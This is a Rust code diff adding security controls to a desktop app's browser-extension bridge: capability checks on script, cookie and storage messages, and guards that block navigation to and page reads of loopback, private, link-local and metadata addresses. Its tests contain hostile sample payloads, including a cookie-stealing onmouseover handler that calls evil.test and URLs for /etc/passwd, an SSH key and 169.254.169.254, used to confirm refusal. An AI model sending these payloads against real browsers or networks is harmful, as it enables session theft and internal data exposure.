@@ -1,9 +1,11 @@
 use super::{PresenceManager, RealtimeEvent};
 use crate::automation::browser::advanced::Cookie;
 use crate::automation::browser::{AccessibilityAnalyzer, AdvancedBrowserOps, CdpClient};
+use crate::automation::computer_use::ensure_navigation_url_allowed;
 use crate::integrations::native_messaging::manifest::{
     install_manifests, is_valid_chrome_extension_id,
 };
+use crate::integrations::native_messaging::messages::{ExtensionCapabilities, NativeCapability};
 use crate::integrations::native_messaging::{
     stage_selected_context_handoff, ConnectionState, NativeMessage,
 };
@@ -16,7 +18,7 @@ use futures::{
 };
 use serde_json::{json, Value};
 use std::collections::HashMap;
-use std::net::{IpAddr, SocketAddr};
+use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr, ToSocketAddrs};
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 use subtle::ConstantTimeEq;
@@ -55,6 +57,81 @@ const MAX_AUTH_FAILURES: u32 = 5;
 const AUTH_FAILURE_WINDOW: Duration = Duration::from_secs(60);
 const LOCKOUT_DURATION: Duration = Duration::from_secs(300);
 const MAX_WS_MESSAGE_SIZE: usize = 4 * 1024 * 1024;
+
+// Bridge navigation policy ───────────────────────────────────────────────────
+//
+// A peer that presents the loopback token picks navigation targets the user
+// never saw. `ensure_navigation_url_allowed` keeps every caller off non-http
+// schemes; these decide the second half, which only binds automated targets:
+// the browser must not be steered at anything that is not routable on the
+// public internet, because the same socket can read the answer back.
+
+/// The empty document a new tab is created on. It has no origin and no content.
+const BLANK_DOCUMENT_URL: &str = "about:blank";
+
+/// How long a hostname gets to resolve before the navigation is refused.
+const BRIDGE_DNS_TIMEOUT: Duration = Duration::from_secs(2);
+
+fn is_internal_ipv4(address: Ipv4Addr) -> bool {
+    let [first, second, ..] = address.octets();
+    address.is_loopback()
+        || address.is_private()
+        || address.is_link_local()
+        || address.is_unspecified()
+        || address.is_broadcast()
+        || address.is_multicast()
+        || first == 0
+        || (first == 100 && (64..128).contains(&second))
+        || (first == 192 && second == 0)
+        || (first == 198 && (18..20).contains(&second))
+}
+
+fn is_internal_ipv6(address: Ipv6Addr) -> bool {
+    if address.is_loopback() || address.is_unspecified() || address.is_multicast() {
+        return true;
+    }
+    if let Some(mapped) = address.to_ipv4_mapped() {
+        return is_internal_ipv4(mapped);
+    }
+    let segments = address.segments();
+    // ::a.b.c.d and 64:ff9b::/96 both carry a v4 destination inside a v6
+    // literal, so the v4 policy has to run on the address they carry.
+    if segments[..6] == [0, 0, 0, 0, 0, 0] || (segments[0] == 0x64 && segments[1] == 0xff9b) {
+        let octets = address.octets();
+        return is_internal_ipv4(Ipv4Addr::new(
+            octets[12], octets[13], octets[14], octets[15],
+        ));
+    }
+    segments[0] & 0xfe00 == 0xfc00 || segments[0] & 0xffc0 == 0xfe80
+}
+
+fn is_internal_ip(address: &IpAddr) -> bool {
+    match address {
+        IpAddr::V4(v4) => is_internal_ipv4(*v4),
+        IpAddr::V6(v6) => is_internal_ipv6(*v6),
+    }
+}
+
+fn is_loopback_domain(host: &str) -> bool {
+    let lowered = host.trim_end_matches('.').to_lowercase();
+    lowered == "localhost" || lowered.ends_with(".localhost")
+}
+
+/// Resolve `host` on the blocking pool so a hung resolver occupies no runtime
+/// worker. `None` means the answer never arrived, which the caller refuses.
+async fn resolve_navigation_host(host: &str) -> Option<Vec<IpAddr>> {
+    let query = format!("{host}:443");
+    let lookup = tokio::task::spawn_blocking(move || {
+        query
+            .to_socket_addrs()
+            .map(|addresses| addresses.map(|address| address.ip()).collect::<Vec<_>>())
+            .ok()
+    });
+    tokio::time::timeout(BRIDGE_DNS_TIMEOUT, lookup)
+        .await
+        .ok()?
+        .ok()?
+}
 
 #[derive(Default)]
 struct AuthFailureRecord {
@@ -359,6 +436,10 @@ pub struct WebSocketClient {
     pub team_id: Option<String>,
     /// The resource this client is currently interacting with (e.g. typing in)
     pub current_resource: Option<String>,
+    /// Capabilities this connection negotiated at `connect`. Holding the bridge
+    /// token authenticates a peer; it does not authorize the privileged native
+    /// messages, so this starts empty and only a negotiation can raise it.
+    pub capabilities: ExtensionCapabilities,
 }
 
 pub struct RealtimeServer {
@@ -1199,6 +1280,7 @@ impl RealtimeServer {
                     user_id: user_id_from_auth,
                     team_id: team_id_from_auth,
                     current_resource: None,
+                    capabilities: ExtensionCapabilities::none(),
                 },
             );
         }
@@ -1341,8 +1423,31 @@ impl RealtimeServer {
                     emit_tool_started(app, id, &tool_name, Some(payload.clone()));
                 }
 
-                let execution = Self::execute_native_message(payload.clone(), app_handle).await;
+                let granted = {
+                    let clients_lock = clients.lock().await;
+                    clients_lock
+                        .get(client_id)
+                        .map(|client| client.capabilities.clone())
+                        .unwrap_or_else(ExtensionCapabilities::none)
+                };
+
+                let execution =
+                    Self::execute_native_message(payload.clone(), app_handle, &granted).await;
                 let duration_ms = started_at.elapsed().as_millis() as u64;
+
+                if execution.is_ok() {
+                    let renegotiated = match native_type.as_str() {
+                        "connect" => Some(Self::negotiated_capabilities(&payload)),
+                        "disconnect" => Some(ExtensionCapabilities::none()),
+                        _ => None,
+                    };
+                    if let Some(capabilities) = renegotiated {
+                        let mut clients_lock = clients.lock().await;
+                        if let Some(client) = clients_lock.get_mut(client_id) {
+                            client.capabilities = capabilities;
+                        }
+                    }
+                }
 
                 let response = match execution {
                     Ok(data) => RealtimeEvent::NativeResponse {
@@ -1522,12 +1627,147 @@ impl RealtimeServer {
         }
     }
 
+    /// Capabilities the peer declared in its `connect` payload, clamped to what
+    /// the bridge is allowed to grant. An absent or malformed declaration
+    /// negotiates nothing.
+    fn negotiated_capabilities(payload: &Value) -> ExtensionCapabilities {
+        let declared = payload
+            .get("capabilities")
+            .and_then(|declared| {
+                serde_json::from_value::<ExtensionCapabilities>(declared.clone()).ok()
+            })
+            .unwrap_or_else(ExtensionCapabilities::none);
+        ExtensionCapabilities::negotiate(&declared)
+    }
+
+    /// Where a realtime-bridge peer may drive the live browser.
+    ///
+    /// `ensure_navigation_url_allowed` settles the scheme and the blocked-host
+    /// list for every navigation in the app, including the ones the user types.
+    /// This adds what only holds when a bridge peer picked the destination: no
+    /// loopback, private, carrier-grade-NAT, or link-local target, so the peer
+    /// cannot aim the browser at a dev server, a LAN device, or a cloud
+    /// metadata endpoint and read the answer back over the same socket.
+    ///
+    /// A hostname that does not resolve inside the timeout is refused rather
+    /// than waved through: a resolver that stalls, fails, or answers
+    /// differently each time is the mechanism a rebinding attack runs on.
+    async fn ensure_bridge_navigation_allowed(url: &str) -> Result<(), String> {
+        let candidate = url.trim();
+        if candidate.eq_ignore_ascii_case(BLANK_DOCUMENT_URL) {
+            return Ok(());
+        }
+        ensure_navigation_url_allowed(candidate)?;
+
+        let Ok(parsed) = url::Url::parse(candidate) else {
+            return Err(
+                "Navigation is blocked: the target is not an absolute http(s) URL.".to_string(),
+            );
+        };
+        let Some(host) = parsed.host() else {
+            return Err("Navigation is blocked: the target http(s) URL has no host.".to_string());
+        };
+
+        let internal = match host {
+            url::Host::Ipv4(address) => is_internal_ipv4(address),
+            url::Host::Ipv6(address) => is_internal_ipv6(address),
+            url::Host::Domain(name) if is_loopback_domain(name) => true,
+            url::Host::Domain(name) => match resolve_navigation_host(name).await {
+                Some(addresses) => addresses.is_empty() || addresses.iter().any(is_internal_ip),
+                None => {
+                    tracing::warn!("blocked bridge navigation to unresolvable host: {name}");
+                    return Err(format!(
+                        "Navigation to {name} is blocked: the host did not resolve, so where it points cannot be checked."
+                    ));
+                }
+            },
+        };
+
+        if internal {
+            tracing::warn!("blocked bridge navigation to internal destination: {candidate}");
+            return Err(
+                "Navigation is blocked: automated browsing may not reach loopback, private, or link-local addresses."
+                    .to_string(),
+            );
+        }
+
+        Ok(())
+    }
+
+    /// Whether the bridge may hand a peer what the live document holds.
+    ///
+    /// The navigation guard only sees the first hop. A page a peer opened can
+    /// redirect into an internal service, so the destination is re-checked from
+    /// the document itself before its markup, text, or pixels leave the browser.
+    /// Address literals are enough here — the metadata and router endpoints a
+    /// redirect chain lands on are literals — and skipping DNS keeps every read
+    /// off the resolver.
+    fn ensure_document_readable(url: &str) -> Result<(), String> {
+        let candidate = url.trim();
+        if candidate.is_empty() || candidate.eq_ignore_ascii_case(BLANK_DOCUMENT_URL) {
+            return Ok(());
+        }
+        let Ok(parsed) = url::Url::parse(candidate) else {
+            return Ok(());
+        };
+
+        let scheme = parsed.scheme().to_ascii_lowercase();
+        if !matches!(scheme.as_str(), "http" | "https") {
+            tracing::warn!("blocked bridge read of a {scheme}: document");
+            return Err(format!(
+                "Reading a {scheme}: document over the extension bridge is blocked."
+            ));
+        }
+
+        let internal = match parsed.host() {
+            Some(url::Host::Ipv4(address)) => is_internal_ipv4(address),
+            Some(url::Host::Ipv6(address)) => is_internal_ipv6(address),
+            Some(url::Host::Domain(name)) => is_loopback_domain(name),
+            None => true,
+        };
+
+        if internal {
+            tracing::warn!("blocked bridge read of an internal document: {candidate}");
+            return Err(
+                "Reading this page over the extension bridge is blocked: the tab is on a loopback, private, or link-local address."
+                    .to_string(),
+            );
+        }
+
+        Ok(())
+    }
+
+    async fn get_native_cdp_client_for_read(
+        app_handle: &tauri::AppHandle,
+        requested_tab_id: Option<i32>,
+    ) -> Result<(Arc<CdpClient>, String), String> {
+        let (client, resolved_tab_id) =
+            Self::get_native_cdp_client(app_handle, requested_tab_id, false, None).await?;
+        let landed = client.get_url().await.map_err(|e| e.to_string())?;
+        Self::ensure_document_readable(&landed)?;
+        Ok((client, resolved_tab_id))
+    }
+
     async fn execute_native_message(
         payload: Value,
         app_handle: Option<&tauri::AppHandle>,
+        capabilities: &ExtensionCapabilities,
     ) -> Result<Value, String> {
         let message: NativeMessage = serde_json::from_value(payload)
             .map_err(|e| format!("Invalid native message payload: {}", e))?;
+
+        if let Some(required) = NativeCapability::required_for(&message) {
+            if !capabilities.grants(required) {
+                tracing::warn!(
+                    "refused native message: connection never negotiated {} capability",
+                    required.label()
+                );
+                return Err(format!(
+                    "Native message refused: this connection has no {} capability.",
+                    required.label()
+                ));
+            }
+        }
 
         match message {
             NativeMessage::Ping => Ok(json!({ "pong": true })),
@@ -1652,6 +1892,7 @@ impl RealtimeServer {
             }
 
             NativeMessage::CreateTab { url } => {
+                Self::ensure_bridge_navigation_allowed(&url).await?;
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let browser_state = app.state::<BrowserStateWrapper>();
                 let tab_manager = browser_state
@@ -1710,6 +1951,7 @@ impl RealtimeServer {
             }
 
             NativeMessage::Navigate { url, tab_id } => {
+                Self::ensure_bridge_navigation_allowed(&url).await?;
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
                     Self::get_native_cdp_client(app, tab_id, true, Some(&url)).await?;
@@ -1762,7 +2004,7 @@ impl RealtimeServer {
             NativeMessage::GetElement { selector, tab_id } => {
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
+                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                 // JSON-encode the selector into a JS string literal (quotes + full
                 // escaping included). Single-quote-only escaping was insufficient —
                 // backslashes/newlines could break out of the literal and inject JS.
@@ -1794,7 +2036,7 @@ impl RealtimeServer {
             NativeMessage::GetElements { selector, tab_id } => {
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
+                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                 let elements = client
                     .query_all(&selector)
                     .await
@@ -1810,7 +2052,7 @@ impl RealtimeServer {
             NativeMessage::GetText { selector, tab_id } => {
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
+                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                 let text = client
                     .get_text(&selector)
                     .await
@@ -1830,7 +2072,7 @@ impl RealtimeServer {
             } => {
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
+                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                 let value = client
                     .get_attribute(&selector, &attribute)
                     .await
@@ -1886,7 +2128,7 @@ impl RealtimeServer {
             NativeMessage::Screenshot { tab_id, format } => {
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
+                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                 let image_bytes = client
                     .capture_screenshot(false)
                     .await
@@ -1903,7 +2145,7 @@ impl RealtimeServer {
             NativeMessage::GetAccessibilityTree { tab_id } => {
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
+                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                 let tree = client
                     .evaluate(AccessibilityAnalyzer::get_accessibility_tree_script())
                     .await
@@ -1918,7 +2160,7 @@ impl RealtimeServer {
             NativeMessage::GetFocusableElements { tab_id } => {
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
+                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                 let elements = client
                     .evaluate(
                         r#"(function() {
@@ -2044,7 +2286,7 @@ impl RealtimeServer {
             NativeMessage::GetPageInfo { tab_id } => {
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
+                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                 let url = client.get_url().await.map_err(|e| e.to_string())?;
                 let title = client.get_title().await.map_err(|e| e.to_string())?;
 
@@ -2058,7 +2300,7 @@ impl RealtimeServer {
             NativeMessage::GetPageContent { tab_id } => {
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
+                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                 let html = client.get_content().await.map_err(|e| e.to_string())?;
 
                 Ok(json!({
@@ -2394,6 +2636,7 @@ mod tests {
                 user_id: Some("vscode-extension".to_string()),
                 team_id: None,
                 current_resource: None,
+                capabilities: ExtensionCapabilities::none(),
             },
         );
 
@@ -3158,7 +3401,12 @@ mod tests {
 
     #[tokio::test]
     async fn test_execute_native_message_ping() {
-        let result = RealtimeServer::execute_native_message(json!({ "type": "ping" }), None).await;
+        let result = RealtimeServer::execute_native_message(
+            json!({ "type": "ping" }),
+            None,
+            &ExtensionCapabilities::none(),
+        )
+        .await;
 
         assert!(result.is_ok());
         assert_eq!(result.unwrap(), json!({ "pong": true }));
@@ -3172,6 +3420,7 @@ mod tests {
         let result = RealtimeServer::execute_native_message(
             json!({ "type": "connect", "extension_id": ext_id }),
             None,
+            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3186,6 +3435,7 @@ mod tests {
         let result = RealtimeServer::execute_native_message(
             json!({ "type": "connect", "extension_id": "ext_123" }),
             None,
+            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3197,6 +3447,7 @@ mod tests {
         let result = RealtimeServer::execute_native_message(
             json!({ "type": "disconnect", "reason": "test_disconnect" }),
             None,
+            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3208,8 +3459,12 @@ mod tests {
 
     #[tokio::test]
     async fn test_execute_native_message_rejects_invalid_payload() {
-        let result =
-            RealtimeServer::execute_native_message(json!({ "type": "unknown_type" }), None).await;
+        let result = RealtimeServer::execute_native_message(
+            json!({ "type": "unknown_type" }),
+            None,
+            &ExtensionCapabilities::none(),
+        )
+        .await;
 
         assert!(result.is_err());
         assert!(result
@@ -3231,6 +3486,7 @@ mod tests {
                 "timestamp": 1
             }),
             None,
+            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3255,6 +3511,7 @@ mod tests {
                 "duration": 12
             }),
             None,
+            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3263,6 +3520,320 @@ mod tests {
             .err()
             .unwrap_or_default()
             .contains("Desktop app handle unavailable"));
+    }
+
+    // ── F15: native-message capability authorization ────────────────────────
+    //
+    // Presenting the bridge token used to grant every native message. These pin
+    // the refusal so a token-holding peer cannot run JavaScript in the user's
+    // signed-in tabs or read their cookies and local storage.
+
+    fn privileged_native_payloads() -> Vec<(Value, &'static str)> {
+        vec![
+            (
+                json!({ "type": "execute_script", "script": "fetch('https://evil.test')" }),
+                "script execution",
+            ),
+            (
+                json!({ "type": "get_cookies", "url": "https://example.com" }),
+                "cookie access",
+            ),
+            (
+                json!({
+                    "type": "set_cookie",
+                    "cookie": {
+                        "name": "session",
+                        "value": "stolen",
+                        "domain": null,
+                        "path": null,
+                        "secure": null,
+                        "http_only": null,
+                        "expires": null
+                    }
+                }),
+                "cookie access",
+            ),
+            (
+                json!({ "type": "get_local_storage", "key": null, "tab_id": null }),
+                "local storage access",
+            ),
+            (
+                json!({ "type": "set_local_storage", "key": "k", "value": "v", "tab_id": null }),
+                "local storage access",
+            ),
+            (
+                json!({
+                    "type": "set_attribute",
+                    "selector": "body",
+                    "attribute": "onmouseover",
+                    "value": "fetch('https://evil.test/x?c='+document.cookie)",
+                    "tab_id": null
+                }),
+                "script execution",
+            ),
+        ]
+    }
+
+    #[tokio::test]
+    async fn privileged_native_messages_are_refused_without_a_negotiated_capability() {
+        for (payload, capability) in privileged_native_payloads() {
+            let error = RealtimeServer::execute_native_message(
+                payload.clone(),
+                None,
+                &ExtensionCapabilities::none(),
+            )
+            .await
+            .expect_err(&format!("{payload} ran without a capability check"));
+
+            assert!(
+                error.contains(capability),
+                "expected a {capability} refusal for {payload}, got: {error}"
+            );
+            assert!(
+                !error.contains("Desktop app handle"),
+                "{payload} reached the browser sink before the capability check: {error}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn a_privileged_message_runs_once_its_capability_is_granted() {
+        let mut granted = ExtensionCapabilities::none();
+        granted.supports_cookies = true;
+
+        let error = RealtimeServer::execute_native_message(
+            json!({ "type": "get_cookies", "url": "https://example.com" }),
+            None,
+            &granted,
+        )
+        .await
+        .expect_err("no app handle is available in unit tests");
+
+        assert!(
+            error.contains("Desktop app handle"),
+            "a granted capability must reach the handler, got: {error}"
+        );
+    }
+
+    #[test]
+    fn a_peer_cannot_negotiate_itself_script_cookie_or_storage_access() {
+        let negotiated = RealtimeServer::negotiated_capabilities(&json!({
+            "type": "connect",
+            "extension_id": "abcdefghijklmnopabcdefghijklmnop",
+            "capabilities": {
+                "version": "9.9.9",
+                "supports_accessibility_tree": true,
+                "supports_screenshot": true,
+                "supports_cookies": true,
+                "supports_local_storage": true,
+                "supports_form_fill": true,
+                "supports_script_execution": true
+            }
+        }));
+
+        assert!(!negotiated.grants(NativeCapability::ScriptExecution));
+        assert!(!negotiated.grants(NativeCapability::Cookies));
+        assert!(!negotiated.grants(NativeCapability::LocalStorage));
+        assert!(negotiated.supports_accessibility_tree);
+        assert!(negotiated.supports_screenshot);
+        assert!(negotiated.supports_form_fill);
+    }
+
+    #[test]
+    fn a_connect_payload_negotiates_only_the_flags_it_declares() {
+        let partial = RealtimeServer::negotiated_capabilities(&json!({
+            "type": "connect",
+            "capabilities": { "supports_screenshot": true }
+        }));
+        assert!(partial.supports_screenshot);
+        assert!(!partial.supports_accessibility_tree);
+        assert!(!partial.supports_form_fill);
+
+        let absent = RealtimeServer::negotiated_capabilities(&json!({ "type": "connect" }));
+        assert!(!absent.supports_screenshot);
+        assert!(!absent.supports_accessibility_tree);
+        assert!(!absent.supports_form_fill);
+    }
+
+    #[tokio::test]
+    async fn set_attribute_cannot_smuggle_script_execution_past_the_capability_gate() {
+        // The gate used to name ExecuteScript alone, so this pair ran arbitrary
+        // JavaScript in the signed-in tab with no capability at all: the first
+        // message writes an inline handler through el.setAttribute, the second
+        // dispatches the mouseover that fires it.
+        let injection = json!({
+            "type": "set_attribute",
+            "selector": "body",
+            "attribute": "onmouseover",
+            "value": "fetch('https://evil.test/x?c='+encodeURIComponent(document.cookie))",
+            "tab_id": null
+        });
+
+        let error =
+            RealtimeServer::execute_native_message(injection, None, &ExtensionCapabilities::none())
+                .await
+                .expect_err("set_attribute ran without a capability check");
+
+        assert!(
+            error.contains("script execution"),
+            "expected a script-execution refusal, got: {error}"
+        );
+        assert!(
+            !error.contains("Desktop app handle"),
+            "set_attribute reached the browser sink before the capability check: {error}"
+        );
+    }
+
+    #[test]
+    fn every_sink_that_writes_an_attribute_or_a_script_needs_the_script_grant() {
+        for message in [
+            NativeMessage::ExecuteScript {
+                script: "1".to_string(),
+                tab_id: None,
+            },
+            NativeMessage::SetAttribute {
+                selector: "form".to_string(),
+                attribute: "action".to_string(),
+                value: "https://evil.test/collect".to_string(),
+                tab_id: None,
+            },
+        ] {
+            assert_eq!(
+                NativeCapability::required_for(&message),
+                Some(NativeCapability::ScriptExecution)
+            );
+        }
+    }
+
+    // ── F23: where a bridge peer may drive the browser ──────────────────────
+    //
+    // Navigate used to hand `url` straight to Page.navigate, so the peer could
+    // open a local file or an internal service and read it back. The guard runs
+    // before the app handle is resolved, so "Desktop app handle unavailable"
+    // means the message got past it.
+
+    async fn native_message_error(payload: Value) -> String {
+        RealtimeServer::execute_native_message(
+            payload.clone(),
+            None,
+            &ExtensionCapabilities::none(),
+        )
+        .await
+        .expect_err(&format!("{payload} was not refused"))
+    }
+
+    #[tokio::test]
+    async fn navigate_refuses_local_files_and_internal_destinations() {
+        for url in [
+            "file:///etc/passwd",
+            "file:///Users/victim/.ssh/id_rsa",
+            "data:text/html,<script>fetch('https://evil.test')</script>",
+            "javascript:alert(document.cookie)",
+            "chrome://settings",
+            "http://127.0.0.1:8080/admin",
+            "http://localhost:3000/",
+            "https://api.localhost/",
+            "http://[::1]:9229/json",
+            "http://10.1.2.3/",
+            "http://192.168.1.1/",
+            "http://172.16.0.9/",
+            "http://169.254.169.254/latest/meta-data/",
+            "http://[::ffff:169.254.169.254]/",
+            "http://100.64.0.1/",
+            "http://0.0.0.0/",
+            "http://2130706433/",
+            "http://127.1/",
+        ] {
+            let error = native_message_error(json!({ "type": "navigate", "url": url })).await;
+            assert!(
+                !error.contains("Desktop app handle"),
+                "{url} reached the browser: {error}"
+            );
+
+            let error = native_message_error(json!({ "type": "create_tab", "url": url })).await;
+            assert!(
+                !error.contains("Desktop app handle"),
+                "{url} reached tab creation: {error}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn navigate_refuses_a_host_whose_address_cannot_be_checked() {
+        let error = native_message_error(
+            json!({ "type": "navigate", "url": "https://never-resolves.invalid/" }),
+        )
+        .await;
+
+        assert!(
+            error.contains("did not resolve"),
+            "an unresolvable host must fail closed, got: {error}"
+        );
+    }
+
+    #[tokio::test]
+    async fn navigate_still_reaches_the_browser_for_a_public_destination() {
+        let error =
+            native_message_error(json!({ "type": "navigate", "url": "http://93.184.216.34/" }))
+                .await;
+
+        assert!(
+            error.contains("Desktop app handle"),
+            "a public destination must pass the guard, got: {error}"
+        );
+    }
+
+    #[test]
+    fn page_reads_are_refused_when_the_tab_landed_on_an_internal_document() {
+        // A redirect the guard never saw is the way an internal service still
+        // ends up in the tab, so the live document is what decides the read.
+        for url in [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://127.0.0.1:3000/admin",
+            "http://localhost:8080/",
+            "http://192.168.0.1/",
+            "http://[::1]/",
+            "file:///etc/passwd",
+        ] {
+            assert!(
+                RealtimeServer::ensure_document_readable(url).is_err(),
+                "expected a read of {url} to be refused"
+            );
+        }
+    }
+
+    #[test]
+    fn page_reads_still_work_on_an_ordinary_document() {
+        for url in [
+            "https://example.com/docs",
+            "http://93.184.216.34/",
+            "about:blank",
+            "",
+        ] {
+            assert!(
+                RealtimeServer::ensure_document_readable(url).is_ok(),
+                "expected a read of {url} to be allowed"
+            );
+        }
+    }
+
+    #[test]
+    fn an_authenticated_connection_starts_with_no_capabilities() {
+        let client = WebSocketClient {
+            id: "client-1".to_string(),
+            user_id: Some("vscode-extension".to_string()),
+            team_id: None,
+            current_resource: None,
+            capabilities: ExtensionCapabilities::none(),
+        };
+
+        for capability in [
+            NativeCapability::ScriptExecution,
+            NativeCapability::Cookies,
+            NativeCapability::LocalStorage,
+        ] {
+            assert!(!client.capabilities.grants(capability));
+        }
     }
 
     // ── B3 fix: Origin allowlist tests ──────────────────────────────────────
